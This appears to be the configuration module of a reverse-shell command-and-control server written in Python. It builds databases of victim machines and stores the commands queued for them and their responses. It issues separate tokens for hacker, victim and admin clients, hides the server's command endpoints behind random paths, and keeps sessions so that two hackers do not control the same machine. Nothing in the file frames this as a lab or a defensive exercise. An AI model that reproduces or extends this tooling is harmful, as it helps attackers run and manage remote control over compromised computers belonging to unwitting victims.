""" Accept and validate configuration, and facilitate and make ready any other
data that is potentially useful for the server. """

import json as js
import sqlite3 as sq
from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser, Namespace
from pathlib import Path
from typing import Any

import reverse_shell.utils as ut

# --- the imports
from reverse_shell import __app_name__, __version__
from reverse_shell.server import ErrorCodes as ec


class Config:
    def __init__(self, config: Namespace, allow_multi_thread_db_access=False):
        # ---- Schema

        # Required database schema for the session and data databases.
        self.session_data_schema = [
            """
        CREATE TABLE IF NOT EXISTS victim_info(
            id TEXT PRIMARY KEY,
            host_name TEXT,
            os TEXT,
            arch TEXT,
            cpu TEXT,
            ram TEXT
        )
        """,
            """
        CREATE TABLE IF NOT EXISTS commands(
            command_id TEXT PRIMARY KEY,
            victim_id TEXT,
            command TEXT,
            date DATE
        )
        """,
            """
        CREATE TABLE IF NOT EXISTS responses(
            response_id TEXT PRIMARY KEY,
            victim_id TEXT,
            response TEXT,
            command_id TEXT,
            FOREIGN KEY(command_id) REFERENCES commands(command_id)
        )
        """,
            """
        CREATE TABLE IF NOT EXISTS clients(
            client_id TEXT PRIMARY KEY,
            client_type TEXT,
            status INTEGER
        )
        """,
        ]

        # ---- MultiThreaded DB(mainly used for testing)
        self.allow_multi_thread_db_access = allow_multi_thread_db_access

        # A map of a victim with it's hacker that are in a live session
        # used to prevent multiple hackers hacking the same machine at once.
        self.hacking_sessions: dict[str, str] = {
            # victim_id: hacker_id
        }

        self.config = config

        # ---- Database initialization
        self.profile, self.profile_path = self.get_profile("profile.json")
        self.session_data_db = self.get_database(
            "data.db", self.config.session_data, self.session_data_schema
        )

        # ---- Tokens
        self.auth_token = self.get_token("auth_token")
        self.admin_token = self.get_token("admin_token")
        self.hacker_token = self.get_token("hacker_token")

        # ---- Server Commands

        # Server commands are request paths used like commands by the clients
        # to make the server do the command. privileges will be assigned
        # to each command.

        self.server_cmd_privileges = {
            "verify": [ut.ClientType.Victim, ut.ClientType.Admin, ut.ClientType.Hacker],
            "fetch_cmd": [ut.ClientType.Victim],
            "post_res": [ut.ClientType.Victim],
            "post_cmd": [ut.ClientType.Hacker],
            "fetch_res": [ut.ClientType.Hacker],
            "create_session": [ut.ClientType.Hacker],
        }

        self.server_cmds = {
            self.get_server_cmd_id(cmd): cmd for cmd in self.server_cmd_privileges
        }

        # ---- Python and response type map
        self.py_res_type_map = {
            str: "plain/text",
            dict: "application/json",
            list: "application/json",
        }

        # ---- IP and port
        self.port = self.get_port_ip("port", self.config.port, 8080)
        self.ip = self.get_port_ip("ip", self.config.ip, "0.0.0.0")

        # ---- Debug flag
        self.is_debug = self.config.debug

        # ---- Saving profile changes
        self.commit_profile()

    def get_server_cmd_id(self, cmd: str):
        """Get the server command from the profiles."""
        # Let's first check for the server_cmds entry in the profile
        # and create it if it doesn't exist
        if (server_cmds := self.query_profile("server_commands")) is None:
            self.profile["server_commands"], server_cmds = {}, {}

        # Let's now get the cmd from within the server_cmds
        cmd_id = self.query_profile(cmd, profile=server_cmds)

        if cmd_id is None:
            # Let's now create the command id and save it in the profiles
            cmd_id = f"/{ut.generate_token()[:8]}"
            self.profile["server_commands"][cmd] = cmd_id

        return cmd_id

    def get_port_ip(self, profile_field: str, user_option, default):
        """Get and validate the ip and port range."""
        # First check if the field is given then
        # check for the profile.
        # Before all that let's check if the 'addresses' field exists
        # in profile if it doesn't exist, create it.

        if (address := self.query_profile("address")) is None:
            self.profile["address"], address = {}, {}

        field = user_option

        if field is None:
            # This means the user didn't provide the field
            # so let's query from the profile if it's found there
            field = self.query_profile(profile_field, profile=address)
            if field is None:
                # the  field is not found in the profile
                # so let's set the default to the field
                field = default

        # and finally set the field in the profile
        self.profile["address"][profile_field] = field

        return field

    def query_profile(self, key: str, profile: dict[Any, Any] | None = None):
        """Get a value in the sessions_file using it's `key`. Returns None if the key is not found in the profile"""

        # Set the profile to self.profile if not given
        if profile is None:
            return self.profile.get(key, None)

        return profile.get(key, None)

    def commit_profile(self):
        """Save the changes made to `self.profile`"""
        ut.write_json(self.profile_path, self.profile)

    def get_token(self, token_name: str):
        """Get the token using the token_name if the token doesn't exist then insert it."""
        # Let's first check for the 'tokens' field
        if (tokens := self.query_profile("tokens")) is None:
            self.profile["tokens"], tokens = {}, {}

        token = self.query_profile(token_name, profile=tokens)

        if token is None:
            token = ut.generate_token()
            self.profile["tokens"][token_name] = token

        return token

    def strip_schema(self, schema: str):
        """Get rid of new lines and strip a schema to make it ready for comparison also remove the `IF NOT EXISTS` that will ruin the string validation."""

        # remove the `IF NOT EXISTS` and `;` since it doesn't exist in the sqlite_schema table
        schema = schema.replace("IF NOT EXISTS ", "")
        schema = schema.replace(";", "")

        schema_lst = schema.splitlines()
        schema_lst = [schema.strip() for schema in schema_lst]

        return "".join(schema_lst)

    def query_db(self, cur: sq.Cursor, query: str, __params=None):
        """Return all results that return from a database query provided by `query` and return None when`sqlite3.OperationalError` occurs"""
        # Let's execute and handle the query
        try:
            cur.execute(query, __params if __params is not None else ())
            return cur.fetchall()
        except sq.Error:
            return None

    def execute_on_session_db(self, statement: str, __params=None):
        """Execute the `statement` on the database and return `None` if `sqlite3.OperationalError` get's raised and the cursor if successful."""
        try:
            conn = self.session_data_db.cursor()
            res_cur = conn.execute(statement, __params if __params is not None else ())
            self.session_data_db.commit()
            return res_cur
        except sq.Error as e:
            ut.log("debug", f"SQLERROR: {e}")
            ut.log("debug", f"    from: `{statement}`")
            return None

    def get_profile(self, profile_name: str):
        profile_filepath = self.config.profile

        if profile_filepath is None:
            # Or the user didn't provide us with a profile,
            # create the base_directory and the profile file
            self.config.base_dir.mkdir(exist_ok=True, parents=True)
            profile_filepath = self.config.base_dir / profile_name
            # Write {} to make it JSON decodable
            ut.write_blank_json(profile_filepath)

        elif isinstance(profile_filepath, Path):
            # Exit with an error if the file provided by the user doesn't exist
            if not profile_filepath.resolve().exists():
                ut.error_exit(
                    f"The file `{profile_filepath}` doesn't exist.", ec.file_not_found
                )

        # This is the validation,  we will just check if there
        # was a decode error when loading the profile
        try:
            # Load the JSON to memory
            profile = js.loads(profile_filepath.read_text())
            return profile, profile_filepath
        except js.JSONDecodeError:
            ut.error_exit(
                "Invalid session file. Please use server generated session files.",
                ec.invalid_file,
            )

    def get_database(
        self, db_name: str, user_config_option: None | Path, db_schema: list[str]
    ) -> sq.Connection:
        """Return a sqlite3 database connection using the user_config_option parameter and validate it using the db_schema option if the database is not provided by the user needed tables will be created using the db_schema list"""

        db_filepath = user_config_option
        is_user_given = True

        if db_filepath is None:
            # Or the user didn't provide us with a database
            # create the base_directory and the database file
            self.config.base_dir.mkdir(exist_ok=True, parents=True)
            db_filepath = self.config.base_dir / db_name
            # Since the file is new it is not user given
            is_user_given = False

        elif isinstance(db_filepath, Path):
            # Exit with an error if the file provided by the user doesn't exist
            if not db_filepath.resolve().exists():
                ut.error_exit(
                    f"The file `{db_filepath}` doesn't exist.", ec.file_not_found
                )

        db = sq.connect(
            db_filepath, check_same_thread=not self.allow_multi_thread_db_access
        )
        cur = db.cursor()

        # Let's now validate the database based on the db_schema argument
        # if the is_user_given var is True.

        # First we are going to get the SQL command
        # that is created for each of the table created
        # found in the sqlite_master table
        cur.execute("SELECT sql FROM sqlite_master")
        schemas = cur.fetchall()

        # If the database is brand new and doesn't have anything on it and it's
        # user provided then we will treat it like a not user given file. if it makes sense
        if is_user_given and schemas != []:
            # Unpack the inner tuples in the list
            schemas = [self.strip_schema(i[0]) for i in schemas if i[0] is not None]

            # We need to strip_schema the database schema given to remove
            # spaces and stuff
            stripped_db_schema = [self.strip_schema(i) for i in db_schema]

            # validate the elements
            is_valid = all(
                self.strip_schema(item) in stripped_db_schema for item in schemas
            )
            if not is_valid:
                ut.error_exit(
                    "Invalid SQL database please use one generated by the server.",
                    ec.invalid_file,
                )

        else:
            # Create the tables needed using the db_schema arg
            # we're just going to execute the commands we get from
            # the db_schema
            for schema_cmd in db_schema:
                cur.execute(schema_cmd)

            db.commit()

        return db


def get_argument_parser():
    """Argument parsing"""
    parser = ArgumentParser(
        prog=f"{__app_name__} server",
        description=f"The server for the {__app_name__} project",
        formatter_class=ArgumentDefaultsHelpFormatter,
    )

    parser.add_argument(
        "--profile",
        "-pf",
        type=Path,
        required=False,
        help=(
            "Server generated profile database used to re-initiate the server with"
            " the same profile as the previous."
        ),
        default=None,
    )

    parser.add_argument(
        "--session-data",
        "-sd",
        type=Path,
        required=False,
        help=("Server generated database used to resume the previous session's data."),
        default=None,
    )

    parser.add_argument(
        "--debug",
        "-d",
        action="store_true",
        required=False,
        help="Run the server in debug mode.",
    )

    parser.add_argument(
        "--base-dir",
        "-b",
        type=Path,
        required=False,
        help="Directory where the server will store it's data.",
        default=Path("server_data"),
    )

    # NotImplemented yet, but will be soon
    parser.add_argument(
        "--pulse-check-frequency",
        "-pcf",
        required=False,
        help=(
            "Frequency of the server checking the status of the victims for their"
            " status(online or offline)."
        ),
    )

    parser.add_argument(
        "-p",
        "--port",
        type=int,
        required=False,
        help="The port on which the server runs on, default=8080",
        default=None,
    )

    parser.add_argument(
        "-i",
        "--ip",
        type=str,
        required=False,
        help=(
            "The ip where the server is hosted on, default=0.0.0.0 i.e, all"
            " interfaces"
        ),
        default=None,
    )

    parser.add_argument(
        "--version",
        "-v",
        action="version",
        version=f"{__app_name__} server v{__version__}",
    )

    return parser


if __name__ == "__main__":
    config = get_argument_parser()
    Config(config.parse_args())
